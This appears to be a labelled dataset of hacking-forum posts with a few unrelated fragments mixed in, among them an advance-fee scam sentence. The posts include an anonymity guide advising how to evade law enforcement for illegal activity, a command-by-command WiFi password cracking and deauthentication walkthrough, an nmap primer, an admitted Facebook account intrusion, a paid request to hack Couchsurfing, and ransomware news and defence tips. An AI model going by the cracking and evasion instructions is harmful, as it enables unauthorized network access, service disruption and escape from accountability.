jpegs or mp3 files on yet another external device. That is, if youre paranoid enough  8) . Some good operating systems for doing this might be: - Virtus(although it runs on Ubuntu 11.10 so maybe not) - Whonix Whonix is built specifically for Virtualization software. You can not install this on your actual computer. Due to the way its built DNS leaks are impossible. liveUSB: Using virtualization software is good practice. However, it IS still on your actual computer. Yet a safer way would be to create a liveUSB. You can do this with UNetbootin, LinuxLive USB Creater(LiLi) or the dd command. dd if=/path/to/iso of=/dev/sdX Create it with no persistence. What is persistence you ask? Persistence is when any settings or modifications you make on a liveUSB stay, or, persist every time you start up the liveOS. The downside to creating a USB with no persistence is that everytime you decide to boot it up, any settings you may wish to have(such as many of the settings I mentioned in the tut so far) will have to be done every single time. However, the upsides I think outweigh the downsides. Basically, a liveUSB with no persistence is like booting into a fresh install of an operating system every time. So on those warm summer days where you feel like talking a relaxing walk to the public library, sitting down with a cool drink, and hacking the gibson, you can! Just pop in your liveUSB and hack away! Ok, dont really do that. But you get my point. This way when you are done you just yank the thing out and the next time you boot it up it will be like nothing ever happened on the liveUSB. If you are going to do anything really serious, this is a good option. Good operating systems for this might be: - Privatix - Liberte - Tails Really though you can use any operating system you want. These are just some examples of anonymity based operating systems. ::IP address Ok ok fine. Ill talk about hiding your IP. Im not going to go quite as in depth as I may have with the other sections of this tutorial because this is only one part of being anonymous that people get too hung up on. Not that its not important. People seem to think this is all you have to do to be anonymous though, and they are wrong. But, it wouldnt be a complete anonymity tutorial without this part now would it? Proxies: Wikipedia says: \""In computer networks, a proxy server is a server (a computer system or an application) that acts as an intermediary for requests from clients seeking resources from other servers. A client connects to the proxy server, requesting some service, such as a file, connection, web page, or other resource available from a different server and the proxy server evaluates the request as a way to simplify and control its complexity. Today, most proxies are web proxies, facilitating access to content on the World Wide Web.\"" Ah yes. Proxies. Some of them log, and some of them dont, but how the hell do we know which ones do and dont? Hard to tell really. There are a few main different kinds of proxies. - Transparent Proxies: Simply put, a transparent proxy is no good for doing anything illegal. You Ip address is logged and shown. Although these may have the advantage of being a bit faster. - Anonymous Proxies: These hide your IP address. One downside is that anything you may connect to can probably tell that you are using a proxy. Which may cause problems for you in many cases. - Elite Proxies: These hide your IP and may hide the fact that you are using a proxy at all. Which can be beneficial. These often times will be the slowest. WARNING: Never assume that any proxy is not logging. Even if they say they arent. A good thing to look at is the country it is in. You should never use a proxy that is in the same country as you. If youve done something worth trying to track you down for, LE wont have any trouble doing so if you used a proxy in your country. What you want to do is figure out which countries have the best privacy laws. Or which ones have the worst so you can avoid them. As far as I know, Sweden has very good privacy laws. China or North Korea however, have shitty ones. The US isnt really the best for internet privacy either. So choose wisely. Another thing to look at is the different kinds of protocols a proxy may use. The main kinds of proxies you will here about are SOCKS proxies and HTTP proxies. SOCKS proxies are lower-level then HTTP proxies. SOCKS uses a network handshake to send information about a connection. The SOCKS proxy then opens a connection, perhaps through a firewall. HTTP Proxies are transported over TCP and forwards an HTTP request through and HTTP server. One simple way to look at it is that HTTP proxies are web-based(obviously), and SOCKS proxies are machine based. Rooting a multitude of SSH servers and chaining them would be an example of a SOCKS proxy topology. Some SOCKS Servers include: - Dante - ss5 - Nylon - sSocks A simple Google search will yield you some up to the minute proxy lists. VPNs: Wikipedia says: \""A virtual private network (VPN) extends a private network and the resources contained in the network across public networks like the Internet. It enables a host computer to send and receive data across shared or public networks as if it were a private network with all the functionality, security and management policies of the private network.[1] This is done by establishing a virtual point-to-point connection through the use of dedicated connections, encryption, or a combination of the two.\"" Theres a major difference between proxies and VPNs. That difference is anonymity vs. privacy. The best way I can explain this is that anonymity means that someone is sticking his dick in all of the birthday cakes, whereas privacy means that Timmy is in the room with all the birthday cakes, but no one knows what hes doing in there. Keep in mind: proxy == anonymous(more or less) VPN == private(Virtual PRIVATE Network) Generally you can guess that the paid VPNs are going to be more reliable than the free ones, given that you arent an idiot who paid for it with your personal credit card and your real name. Again, be aware of where the VPNs are located. So if you are in the US, maybe dont use openVPN for anything illegal. Their headquarters are located in California. Tor: I refuse to talk about Tor. Proxy Chaining: All I can say here is proxychains. Its a very useful tool and its easy to use. With this tool you can chain proxy to proxy, proxy to VPN, proxy to VPN to Tor(if you want), proxy to proxy to proxy to proxy to proxy to VPN to proxy. But lets not get to excessive. You will need to take a look at /etc/proxychains.conf. There isnt a manpage for it, all the directions you need are located in the config file. Basically what you do is add whatever proxies or VPNs you may want(make sure to note the IP and the port number) and you add them after this part: Code: [ProxyList] # add proxy here ... # meanwile # defaults set to \""tor\"" socks4  127.0.0.1 9050 The proxies you add should be in this format: Code: type  host  port So for example: Code: socks4 198.10.23.100 80 Then you run the proxychains program.  Code: proxyresolv targethost.com Other Techniques: Evidentally one of the best ways to remain anonymous is to code your own proxy server, say a SOCKS server, and use other peoples personal machines as proxies. This way you can be absolutely sure that they dont log. Or you can also look into 3proxy which was posted by ande quite awhile back. There is also Botnet proxies if you feel like coding yourself a botnet if thats your thing. This is outside the scope of this tutorial however. ::Check Yourself Sites http://whatsmyuseragent.com/ http://www.whatsmyip.org/ http://www.dnsleaktest.com/ ::Anonymous Emailing -  SilentSender -  Send Anonymous Email -  GuerrillaMail -  DeadFake -  Mailinator -  Melt Mail ::Final Notes This tutorial was inspired by all of the generic, useless, copy/paste anonymity tutorials out there. You know which ones Im talking about. The ones that say: \""Heres a link to CyberGhost and what VPNs are, heres a proxy list, use Truecrypt, make sure to clean up with CCleaner, watch out for Viruses, heres some links to antiviruses. Full anonymous!\"" To all those tutorials out there, thank you for motivating me to write this. This ones for you. As Ive said before, there is no one tutorial out there that will make you completely anonymous. Being completely anonymous is next to impossible. You can take as many precautions as you want but if the NSA is looking for you it doesnt matter how secure your Truecrypt password is and how many keyfiles you have. If you are important enough they wont really need to crack your password. Theyll just beat it out of you. Besides many of the techniques Ive outlined, being anonymous is common sense. Dont link you real email with you hacker identity. Dont talk about crimes youve commited. Use SSL with IRC. If you are going to do anything really serious, dont do it from home. Dont do it from your personal computer. Best of luck to all of you. Hope you gained something from this tutorial. AGAIN: respect goes to  Lucid from Evilzone  for writing this """

OK, fine, it wasnt funny the first time, and it never  will  be, but what I do know is that I can help you crack WiFi passwords! But its my 2nd Post on this website so    and I never ended up explaining who I am, and I never will do. :) What Youll Need Preferably a Linux Computer Preferably a wireless adapter or something like this: A Wireless Network Card LAN Adapter (Unless when you type ifconfig something like wlan0 shows up) Some time on your hand Some will. And thats it! Step 1 Installing The Stuff! These are the things youll need! crunch   (Optional) aircrack-ng You can get these by the following code: Code: apt-get install crunch Code: apt-get install aircrack-ng And then test if they work by lets say typing in crunch and see if something appears up! Step 2 Just do the following code, and ill explain what to do afterwards Code: su Code: ifconfig wlan0 down Code: airmon-ng check With airmon-ng check it will often appear with a load of Names and PIDs, you need to get rid of them if you want to carry on! So spam this command: Code: airmon-ng check kill Dont spam the rest of the commands. Code: iwconfig wlan0 mode monitor Code: ifconfig wlan0 up Replace wlan0 with the name of your wireless adapter Congrats, you are now in the correct mode! You will notice even when you put in ifconfig wlan0 up you still cant access the wifi! Thats because aircrack-ng must operate without wifi! Now lets test out some snazzylicous stuff! What They Do: ifconfig wlan0 down  It turns wlan0 off so we can switch it to monitor mode airmon-ng check  We check if we have any PIDs or Names so we can remove tem airmon-ng check kill  We kill all the PIDs (We spam this command) iwconfig wlan0 mode monitor  It sets it in the correct mode for aircrack-ng ifconfig wlan0 up  It turns the wireless adapter back on! Step 3 Gaining the BSSID + ESSID So, just type in this command: Code: airodump-ng wlan0 In simple terms to explain it to you, it is all the near wifi spots near you, you will notice the ESSIDs and BSSIDs ESSID = The name of the wifi BSSID = The macaddress (basically) Also, as we are using this for  educational purposes  please crack your own, and no one else’s without permission, because I wont take any blame! But anyway, once you find the ESSID of your wifi, copy the BSSID. Step 4 Capturing it! So once youve copied the BSSID do this command: Code: airodump-ng -c [CHANNEL] -w [FILE NAME] --bssid [BSSID HERE] wlan0 Now, lets go over the command -c [CHANNEL]  Replace the channel with the channel name when you do airodump-ng wlan0 -w [FILE NAME]  We are doing this to crack the wifi password, so first we need to put it into a file, so put the file name you want it to be called here. --bssid [BSSID HERE]  Put the BSSID you just copy and pasted there. wlan0  wlan0 is the name of the wireless adapter we have to put at the end. Step 5 Optional Now if you see an ESSID and it says something like <length: 6> that probably means its a hidden ESSID, but dont worry folks theres a way around that! Type in this command: Code: aireplay-ng -0 0 -a [BSSID] wlan0 Lets go over the command! -0 0  The first 0, just always keep it like that, the second 0 is how many times you want to do the attack for, a good number is 30, but if you do 0 it will make it do it forever until you tell it to stop. -a [BSSID]  -a meaning Mac Address, you just put the BSSID There wlan0  Again, the name of the wireless network BTW: You need to be capturing the file while doing this! So run Step 4 WHILST DOING STEP 4! This can also be used for a way to DDoS wifi, as people cannot connect when youre doing this. Step 6 Optional - Word Lists When cracking passwords theres something called a word list! Word lists are useful things, lets say youre trying to crack a password, if it uses a word that is in the word list file, 99% of the time it will crack the password (It also speeds up time) You can use any .lst as a word list! (The best ones are 3gbs of just  words Step 7 Cracking The Password! Now its actually time to crack the password! Read this command but dont type! Code: aircrack-ng -w - [FileName.cap] -e [ESSID] Lets go over it. -w - [FIleName.cap]  Back at Step 4 you did -w [FILENAME] you just do -w [TheFileNameYouPut] and .cap will already be on the end of it -e [ESSID]  The ESSID is the name of the wireless network. If you type that it should work! The problem is itll will take forever for it to finish! So this is when crunch comes in! Step 8 Crunch Now crunch is a tool basically for aircrack-ng, it allows you to add letters or words or word lists to help speed up the process for cracking passwords, so lets say I typed in this instead: Code: crunch 11 11 -t {...} wordlist.lst | aircrack-ng -w - [FileName.cap] -e [ESSID] Lets go over the crunch bit! 11 11  11 is the how small the password could be, and the second 11 is the maximum of how long it could b {...}  You can put letters for the password here. Also you can use codes such as these if you dont know the exact letter or number but know theres a letter or number there\"" @ Will Insert Lower Cased Characters , Will insert upper case characters % will insert numbers ^ will insert numbers Use man crunch for more help For example if i had a password hIckey99 and I wanted to translate it into that I could put: @,@@@@^^ wordlist.lst  Put the name of a word list here Step 9 I feel like im missing something. if I did comment below, Id love to help! Have a nice day! """
0	NMAP! What you need to know! (For N00BS)	"""   Whoami Whoami is a command for linux!  OK, fine that was bad, but anyway! I actually am a new member to this website and I want to help others to increase my knowledge, dont get me wrong, Im not Anonymous, but I can determine that my nMap skills are good enough to teach you! :) What is nMap Nmap is a foot printing tool, or a security scanner, it can be used to discover hosts and services on a network! What I Need A brain! (Even though its medically possible to survive without a brain, you  still  need one A Linux Computer (Sorry, I  Windows and Mac  in my opinion if you wish to be a successful hacker then get Linux, or get Linux on a VM, but  still  get Linux. Some Time! Some  Very  Basic Computer Knowledge (Linux Commands etc)  The Steps! Step 1 First of all you need to see if you have nmap installed! To check this just type nmap, if it comes up with a Usage screen you have got it, if it says uknown command or something along that then you need to install it, it will probably tell you how to install it but here it is anyway: Code: apt-get -y install nmap   By the way, many people dont know what the -y bit does! It makes it automatically say \""Yes\"" it saves time, but if you are bored, and like to look like youre a hacker then miss out the -y and keep typing in Yes Step 2 Second of all, you need to know how to use it! Now, as nmap is a form of hacking, you will need a target, scanning yourself is unrealistic as the timing is so short, so here is a website made by the creators that you can scan (it has some terms though) http://scanme.nmap.org/ Also, you can get websites ip addresses with  Code: nslookup <website>   Or the other way round Code: nslookup <ip> Also, as you are now wanting to be a  stalker    instead of searching Where is this persons IP or something like that there is this cool command for that:  Code: curl ip.info/(ip) Replace (ip) with your IP address, and this will give you all the info about that! Not too hard, now lets get some stuff out of the way before we move on nmap and zenmap Zenmap is the GUI version of NMAP, I prefer the command line one, its better and it can impress people, plus, no one uses zenmap nowadays, and I barely know nothing about it! So stick with nmap! Step 3 Now lets actually scan this website! Now probably if you cannot be bothered to read you have already done: Code: nmap nmap scanme.nmap.org It will work, but you wont be able to see anything, so instead do this: Code: nmap nmap.scanme.nmap.org -vv -vv Shows you whats happening when you run the command! Now you can see all the open ports! Well thats nice for websites, I hear you say, but what about scanning multiple IP addresses? Well lets talk about that. Step 3 Lets scan multiple IP addresses, heres the code Code: nmap -oG - 192.168.1.1-255 -p 22 -vv > /home/Scan1/ For those beginners, you are probably quite confused! Well dont worry! Ill explain what it all means nmap  This is the main command so, we dont really need to explain that one -oG -  This is basically used if you want to scan multiple IP addresses  The IP - [i]This is the IP, youll notice at the end that theres a 1.-255, this is because im scanning all the IP addresses that have that, but at the end it ranges from 1-255, so it would probably be all the working computers or phones in your house -p 22  This is the port, I put 22 as thats the most commonly used port, so id recommend you use -p too. -vv  This means to display everything that happens, we already went other that [*} > /home/Scan1  This means it will store everything that happened in the scan to the File Scan1 in the directory home! At first you may think it is broken, as even if you have the -vv it still wont display as all of this data is being transferred into the file! Now, after the scan go to where you saved the file, and do  Code: cat <file name> Then youll see all the ports that have been scanned, now most of them are going to be down as you dont have that many computers in your house do you? So lets go and view all the UP ones! Code: cat <file name> | grep Up   Make sure its with a capital U for Up Now after that it will show you all the UP IP addresses and there names and more!

He also explained to me that it was because of this wealth and some huge amount of money his business associates supposed to balance his from the deal they had that he was poisoned by his business associates, that I should seek for a God fearing foreign partner in a country of my choice where I will transfer this money and use it for investment purpose, (such as real estate management).

1	Serious help needed!!	"""   Hi, I have done something really silly. I found out my mates husband was cheating on her and got into his Facebook account which he had left open on a android LG phone ( he only uses when in America) to send my friend a message from his FB account with all the details. I used my iPhones personal hotspot to connect and sent the message through that rather then just use wifi. Is it possible that he or someone else thats an experienced hacker could find out my IP address/ location or details tracing it back to me? Im really ashamed, I should have just told her. Any help from you clever computer geniuses would be appreciated. Thank you so much ? X   """

1	Intro and why I am on here....	""" Hi Everyone, I am a newbie to this hacking forum. I am not here to hack per se but I am here to get tips on how to keep my online activity safe. I am a stalking victim or I should say I am a targeted individual by various groups including some bad people in the government. So, why am I stalked, harassed and endangered by lots of people, what did I do, etc. Well, nothing. I have haters, including ex-friends, my father and his family and my exhusband. Plus, after notifying the government, I learned my father had a strange military past and my exhusbands ex is also complaining about being stalked by similar people. Yes, it sounds like I am paranoid which I have every right to be. My life has been threatened, both physically and verbally, I have lost jobs and significant income, I used to make 6 figures and now I make below the poverty line, my privacy has been violated, no matter if it is with my doctor, at work, at home or with a loved one or significant other, which means other peoples privacy has been violated too, I lost family and friends and my moms health worsened and she died worrying about me and these groups attacking me since she was the only one to believe me, and I have been stalked and harassed by strangers in the public and assaulted with vehicles. I have kept track of the activities, I cant tell you everything I know or have on these groups, but I have lots of proof and i have told lots of people, some of which have confirmed my story. My computer is compromised or internet activities. My employment is not safe since they are in my employment. Examples, in my daily activities and at home, private conversations, etc.; strangers or people in my space remark similar activities or conversations I had. Lets say I talk about rock climbing then in a matter of hours or days someone is talking about a similar topic.  So, what i have concluded is that my father and my exhusband are a part of something very bad and there are bad people in the government assisting them. I need help in protecting my electronic activities. I have been a victim of identity theft 4 times over the last 6 or so years. the harassers typically tout me. I know some of them personally and have identified them to the good law enforcement who were willing to help me. But, it is not much they can do until they catch these people in the act. So far the law enforcement has told me that at minimum these groups could be charged with state terrorism, if not federal terrorism charges. Every word I type on my computer is viewed. When I go to my email or other online activities, there is a email or someone in my space in the public mentions something similar to what I have typed or communicated. These groups think they cannot be caught. But, I am sure they can. Their goal is to ruin peoples lives, though these groups seem to be used as pawns for others, these groups are like slaves doing the work of people who do not want to get their hands dirty or connected to this. These groups are similar to the bully that drove Amanda Todd to suicide. But, they will not do it to me. I am strong and I have stood it to them and I will continue to do so. Unfortunately, I have been pegged as crazy due to my fathers criminal behavior. What this has done has not discredited me but has discredited these groups. I do not want others to believe me. Who cares who believes me, that does nothing. What I want is justice.... """

Xss attacks occur when an attacker uses a web application to send malicious code generally in the form of a browser side script to a different end user.Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it. An attacker can use Xss to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted and will execute the script.

1	Grey Hat Hacker Needed — Will Pay	""" I need a grey-hat hacker to send my message to all members of Couchsurfing, for which I can pay up to $1000 (it means that much to me). This grey-hat hack wont harm anyone and will really help me out. Please read my message before you draw any conclusions. My goal is to reach out to likeminded people to form a community of existentialists. I know this is going to work because I did it before with automation: I made some friends this way who later invited me to join an earthship they want to build. Things got complicated when they moved to the USA, and I dont know how this will turn out, but either way it gives me a reason to try it again, because the more the merrier. If were to build a community from the ground up, were going to need people from all walks of life anyway. Im really serious about this: this hack is going to change my life, and Ill keep searching for someone who wants to help me until I find someone, whatever it takes. But I have no illusions of learning how to hack in a few weeks or even months, yet this is the only time Ill need it. The only way I want the message gotten out is as a personal message, which you could send from the administration system (user id:0000000002), like this guy did:  http://www.dailydot.com/crime/couchsurfing-airbnb-1million-users-prank  . So, its been done before, in mid-2014, but Couchsurfing didnt say how the hacker did it, so perhaps thats because they never found out. Even if theyve fixed it, if theres any website that has lots of backdoors it would have to be Couchsurfing: it used to be very poorly programmed and it took them almost a decade to debug. Theyre probably particularly negligent about security, because why would anyone want to hack them? If youre interested, let me know what you think. Post a link here to a fake ebay.co.uk listing and title it \""Faulty Laptop that No One Will Buy\"" so I can search it (just in case), and I will then \""buy\"" it within a day. This way, I can keep you to your word and cant be incriminated. Please only do this if you know what youre doing: theres no rush, just make sure that you finish before youre detected, lest we lose our chance. Youll have 30 days, since buyer protection lasts for 45. (Further comments: I want to ask this in all humility, and the money I offer wont take away from the respect that Ill always owe you. The sum Im offering is probably way higher than what I need to offer, but I want you to have it anyway, because youll have acted from an authentic sense of right and wrong, and people like that can often use it. Perhaps Im having misconceptions about the way hacking works and well need to wait around until a new vulnerability hits the news. If so, pardon my presumption, but the offer remains open, and I will keep checking on this thread. If this isnt the right place to ask this, I apologize: please let me know if you know anywhere or anyone else that I could ask.) THE MESSAGE I WANT TO SEND IS BELOW: This message is sent on behalf of a member: I want to reach out to the entire community in search of any truly authentic person, anyone who is always themselves and accepts everything they experience inside as part of who they are, without ever limiting themselves for the sake of comfort. If you are such a person, you’ll understand, and you will have been searching for such people as well, because youll have felt how you overwhelm others by expressing yourself, how you transcend what they see as boundaries where you see only the infinite. But to people like us, all consciousness is good, and the only evil is to be unconscious: we would rather have any experience than none at all, because we know there is beauty in everything. If you can imagine youd rather live forever through all that could happen, than ever to cease to exist, then you are the kind of person Im looking for. If this very message feels too intense to you, then you can see why I have a problem. We will form a community of our own, one in which no one can tell us what we can or cannot be. Together, we can teach each other every possible aspect of the human experience, and the only thing we will not do will be to do anything that will limit ourselves. I’m reaching out to this community because of all the people I’ve met, those I met here have come the closest to this radical freedom. It’s what this community is about, and its what I want to take to a new level. If youre interested, write a public post on facebook or Twitter with #standnakedbeforetheeyesofthesun and write an introduction, so that we can find each other. Remember to make your post public. With up to 2 million people reading this message, you wont be alone, even if only a tiny fraction will react. """
0	Tox Offers Free build-your-own Ransomware Malware Toolkit	"""   \"" Ransomware \"" threat is on the rise, but the bad news is that Ransomware campaigns are easier to run, and now a Ransomware kit is being offered by hackers for free for anyone to download and distribute the threat. Ransomware is a type of computer virus that infects a target computer, encrypts their sensitive documents and files, and locks the out until the victim pays a ransom amount, most often in Bitcoins. Sometimes even the best security experts arent able to unlock them and end up paying off ransom to crooks in order to get their important files back. Tox — Free Ransomware Kit Now, to spread this creepy threat more easily by even a non-tech user, one dark web hacker has released a ransomware-as-a-service kit, dubbed \"" Tox ,\"" for anyone to download and set up their own ransomware for free. Yes, believe it or not, but  Tox is completely free to use . The developers of the online software make money by taking a cut (20%) of any successful ransomware campaigns its users run. Tox, which  runs on TOR , requires not much technical skills to use and is designed in such a way that almost anyone can easily deploy ransomware in three simple steps, according to security researchers at McAfee who discovered the kit. How to Setup your Custom Ransomware? It takes only a few seconds to create and set up your custom ransomware. Just create an account on the Tox website, without the need to provide your email address or any other identifying information. Once a user register with the site,  follow these three simple steps  to creating your own malware: Type a desired ransom amount you want to ask victims for. Provide an additional note in the \"" Cause \"", presumably the message that will alert victims that they are being held hostage to a piece of malware. Finally, you are prompted to fill out a captcha, and click \"" Create \"". Quote: \""This process creates an executable of about 2MB that is disguised as a .scr file,\""  McAfee  Hidden Content:  You must reply to see links .  \""Then the Tox [users] distribute and install as they see fit. The Tox site (runs on the TOR network) will track the installs and profit. To withdraw funds, you need only supply a receiving Bitcoin address.\"" Your Ransomware is now Ready to infect People: Your custom ransomware, designed to work on Windows systems, is now ready and available to download and spread. Once downloaded, you can target people by sending your virus in an email attachments, just like in the style of traditional phishing emails. Once a victim accidentally opens up the offending  .scr file  provided in an email, the payload will encrypt all of the data on their system and only decrypts if a Bitcoin payment is made. Hidden Content:  You must reply to see links If target pays the ransom amount, the Bitcoin is then transferred to the users Tox account from where  Tox takes a 20 percent cut ,  and the rest can be withdrawn by the user. Ransomware is a growing threat to the evolution of cyber criminals techniques, and many victims, including local police departments, do pay ransom to crooks in an attempt to get their important and personal files back. How to Protect Yourself from Ransomware Threat? Last week, I introduced you a  Hidden Content:  You must reply to see links  that could help you deal with different variants of ransomware malware and unlock encrypted files without paying off a single penny to the cyber crooks. However, there are some necessary steps that should be taken to protect yourself from Ransomware attacks. Remember always to keep regular backups of your important data. Make sure that you run an active anti-virus security suite of tools on your machine. Do not open any email attachments from unknown sources. Finally, browse the Internet safely.

1	Free CryptoLocker Ransomware Decryption Tool Released	"""   When I say Ransomware, the first nasty piece of malware strikes in the mind is CryptoLocker. A nasty strain of ransomware malware that threatened most of the people around the world by effectively destroying important files of the victims forever. CRYPTOLOCKER - A DEVASTATING THREAT CryptoLocker is a simple rather a devastating piece of Ransomware that encrypts the files on a victim’s computer and issues an ultimatum - Pay up or lose your data.  CryptoLocker is particularly designed to extort money from computer users by holding computer files hostage until the computer user pays a ransom fee to get them back. Cryptolocker hijacker sniffs out your personal files and wraps them with strong AES-256-bit encryption before it demands money. HOW TO DECRYPT CRYPTOLOCKER? FREE TOOL RELEASED Thanks to security experts, who created an online service where victims whose systems have been encrypted by the CryptoLocker ransomware can get the decryption keys for free.  This online portal has been created by the security researchers from Security software and services firms Fireeye and Fox-IT. The researchers created the portal after they used a copy of CryptoLockers database of victims that was obtained during the recent takedown of the GameOver Zeus botnet, which was used to distribute the ransomware. \"" This time we basically got lucky, \"" said Michael Sandee, principal analyst at Fox-IT, one of the security firms which helped uncover the cybercrime group behind Cryptolocker. The infrastructure of Cryptolocker and other malware was taken down in June under a campaign known as Operation Tovar, but there are still many cases where this nasty strain of ransomware is infecting users, according to Fireeye. Quote: “ After the success of Operation Tovar, there were few resources available to help decrypt files that were still encrypted with the attacker’s private key, ” Fireeye explains in a  Hidden Content:  You must reply to see links . CRYPTOLOCKER DEMANDS $500, BUT ONLINE DECRYPTION TOOL IS FREE Where CryptoLocker ransomware forced its victim to pay upto $500 in Bitcoins within 72 hours for the private keys necessary to unlock personal files, on the other hand, the security firms are providing the private decryption keys for free via the just-launched Decrypt CryptoLocker website. According to FBI estimates from June, more than 500,000 people fell victim to CryptoLocker between September 2013 and May 2014. Fox-IT says around 1.3 percent of victims paid to free their files, which indicates, the malware earned its makers around $3 million before the criminal network was smashed by authorities and security researchers in May. HOW TO DECRYPT FILES INFECTED BY CRYPTOLOCKER You only need a master decryption key in order to decrypt the locked files. Go to  Hidden Content:  You must reply to see links Upload an email address and one of the encrypted files (one that should have no sensitive information). The online tool will scan the file to figure out the encryption specifics, and then send you a recovery program and master decryption key via an email. You can take that key and the free  decryptolocker.exe  command line tool and decrypt your files.  FireEye warns that some data might not be recoverable, particularly if youve been infected by a CryptoLocker variant rather than CryptoLocker itself. You need to keep this in mind that there are many Cryptolocker variants with the names like PrisonLocker, CryptoDefense, TorLocker and CryptorBit, so the tool may not work against them.   """
0	How to protect your computer from CryptoLocker ransomware malware ?	"""   CryptoLocker  is an especially insidious form of Ransomeware malware that was first detected in the wild in September 2013, restricts access to infected computers and requires victims to pay a ransom in order to regain full access.   What makes CryptoLocker so bad is the way it encrypts the user data on your hard drive using a strong encryption method. This makes it literally impossible to access your own data without paying the ransom amount to the criminals between $100 and $300 or two Bitcoins, even now more. Once affected you will be locked out of your computer and unless you pay the ransom amount in 72 hours , the virus will delete the decryption key to decrypt all the files on your PC . The malware lands on PCs the same way other malware does and a few sensible precautions will help minimize the chances of a CrytoLocker attack.    Yesterday, we reported that - UKs National Crime Agency has given out an urgent national alert that a mass spamming event targeting 10 million UK based email users with CryptoLocker. What if your computer gets compromised?  Currently there is no option to decrypt the files without the decryption key and brute forcing a file encrypted with 2048 bit encryption is almost impossible. If you don’t pay the ransom, you forever lose access to everything you’ve been working on which is stored on your computer. A few things you can do to prevent your PC from getting infected with the CryptoLocker virus: Most viruses are introduced by opening infected attachments or clicking on links to malware usually contained in spam emails. Avoid opening emails and attachments from unknown sources, especially zip or rar archive files. Most people have some anti-virus program, but how do you know it’s effective? Ensure you have best one active and up-to-date. Also keep your operating system and software up-to-date. Keep a backup. If you have a real-time backup software then make sure that you first clean the computer and then restore the unencrypted version of the files. Create files in the Cloud and upload photos to online accounts like Flickr or Picasa. Windows 7 users should set up the System Restore points or, if you are using Windows 8, configure it to keep the file history. Make sure you have reformatted your hard drive to completely remove the CryptoLocker trojan before you attempt to re-install Windows and/or restore your files from a backup. There are many free tools now available in the community, that can help users to protect their systems from this malware.   1.)  Hidden Content:  You must reply to see links  tool,  created by American security expert Nick Shaw. Hidden Content:  You must reply to see links This tool applies a number of settings to your installation of Windows that prevents CryptoLocker from ever executing and has been proven to work in Windows XP and Windows 7 environments. 2.) HitmanPro.Alert 2.5, a  free utility that will help you to protect your computer against the CryptoLocker ransomware malware. Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links  contains a new feature, called  CryptoGuard  that monitors your file system for suspicious operations. When suspicious behavior is detected, the malicious code is neutralized and your files remain safe from harm. 3.) BitDefender Anti-CryptoBlocker,  an  Hidden Content:  You must reply to see links  that can detect and block malware from installation. Intrusion prevention systems  can block the communications protocol send from the Cryptolocker infected system to the remote command-and-control server where the malware retrieves the key to encrypt the files. Blocking the communications can prevent the encryption from taking place. """
3	Introduction	""" Well, to start off my very interesting story, I want to introduce myself as Goblin, now you may be wondering, why are you important? Well I am not, I sit inside all day and stare at pixels, but thats interesting right? I am going to tell you my story, typed from my computer keyboard.   I grew up in Baltimore, Maryland in a small town, my life didnt really consist of much until I really dove deeper into the world of computers/electronics, I really just played XBOX and Call of Duty, then I started getting into computers. This started when my brother was playing Minecraft and I really wanted that game, I started off with a Toshiba laptop for Christmas, 4gb ram, the usual.   I played Minecraft for a good period of my life, nothing to special, but I was always interested in stuff beyond gaming, I was interested in whats inside, what can I really do with this small machine, that is what I asked myself everyday, but I said to myself that I wouldnt be able to just open up my laptop and screw around in it, so I just stuck to Minecraft.   Minecraft was my starting point for meeting online friends, I got Skype which ended up being a big part of my life, but it wasnt anything special to me at the time, but something about these electrical machines just sparked my interests and it was amazing, I was literally wondering how it all worked, how everything was put together, it was all a big jigsaw puzzle to me and I never knew that it would come to affect my life as much as it has.   I didnt really like expressing the fact that I was interested in computers, I thought I would be labeled as \""nerd\"" or \""geek\"", but then I realized. I realized that every kid around me didnt know anything about these machines nor interested in them, it was XBOX or PS3 that they all played, and I thought, do they know how this works?   Fast forward, I met a friend from this Minecraft server I was moderator on, and he was a big hacker, blackhat. Although I was always interested in hacking I really didnt know where to start, and he told me where to start my journey, and thank God he was there, because without him I wouldnt have had the knowledge I have about computers.   Now, I was really big into hacking, Remote Administrator Tools, Distributed Denial of Service, Botnets, it really sparked my interests, and me and my friend had a lot in common, we became really good friends and talked everyday. I realized about the cons of Blackhat hacking and what I could get for doing these things, but I said to myself, \""I could never get caught\"".   Well it turns out that I was bullshitting myself, I was reading about people getting SWATTED and I really dove into how to do it and the science behind it. Now to be clear with everyone, I never did SWAT anyone but one time I got scared shitless.   It was someone threatening me with a SWAT attack and they tried to DOX me but their info was incorrect but I was still scared, I shutdown my computer like the skid I was and looked out my window for 30 minutes straight, my stomach upside down and scared to death. What if I did get SWATTED? What if my family was in danger? I was paranoid about this shit, but they never came through with their threats. Thats when I continued my journey.   I was into RATs and Botnets now, I had a few slaves, not as much as my friend who ran a botnet that could do 1.8gb/s, I was nothing compared to that, a script kiddie, you know. So this was in the summer, this was the summer I barely went outside and just stayed in, hacking, learning, and I have to say, that was the best summer of my life. I learned so much new things and met so many great people that I have lost contact with, mainly because of their stupidity in hacking.   I eventually stopped blackhat hacking for information I cannot disclose   . So I moved onto whitehat hacking, but that wasnt really big for me, so I eventually stopped hacking all in all, but I still have the knowledge, and that was the best part about hacking for me.   So now I am back where I started, nowhere, I honestly just wanted to learn more, about computers. So I moved onto hardware and building computers. I have a few stories about that but my ADHD is coming to me now so I have to finish this thread soon.   Not to mention I upgraded computers, I now have 8gb, a 750 ti, etc, nothing to special.   But then, life happened, I made the decision to move where to my dads, which was emotional for me because I have been living in Baltimore for so many years of my life, so many memories in school and outside of school are just not possible anymore, Ive moved up to Pennsylvania, not Philadelphia, but the more rural place, you know, where they have a lot of ATVs and deer heads on their walls. This was the biggest switch for me, I dont live a rural life, I still have my city ways but it is a big change, for any of you who have been through this before, you know what I mean. But anyways, my life has been an emotional rollercoaster, but I want to pursue a degree in computer engineering and business. Wish me good luck.     I hoped you enjoyed my interesting \""story\"", that is me. Thanks for reading. """
